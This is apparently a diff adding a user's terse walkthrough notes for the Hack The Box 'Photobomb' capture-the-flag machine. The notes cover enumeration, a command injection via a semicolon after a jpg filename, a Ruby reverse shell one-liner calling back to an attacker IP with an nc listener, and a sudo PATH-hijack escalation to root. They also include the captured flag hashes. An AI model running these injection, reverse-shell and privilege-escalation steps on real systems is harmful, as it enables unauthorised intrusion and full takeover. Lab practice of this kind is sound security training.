@@ -1,0 +1,50 @@
+Port 22 ssh - OpenSSH 8.2p1
+Port 80 http - nginx 1.18.0 Ubuntu - http://photobomb.htb
+
+possible username - Jameson
+
+
+
+username and password when ‘view page source’ on the main page photo
+
+nikto -h http://10.10.11.182
+
+tried U:P combo on ssh - didn't work
+
+capture the download button in burp
+find a ruby reverse shell
+		ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.173",4444))'
+enter ; after jpg then paste the shell code
+set up a listener in terminal
+		nc -nvlp 4444
+forward the request in burp
+the shell opens in the listener
+
+pwd 
+		/home/wizard/photobomb
+cd ../
+ls
+		user.txt
+cat user.txt
+		9c02c7cabe2940fc5d178e7aad303353
+		
+sudo -l
+
+
+cat /opt/cleanup.sh
+
+
+try to change the PATH to get root
+
+echo bash > find
+chmod +x find
+sudo PATH=$PWD:$PATH /opt/cleanup.sh
+
+whoami
+root
+
+cat root/root.txt
+		52dfb5473205431223397dbda34773ad
+
+		
+
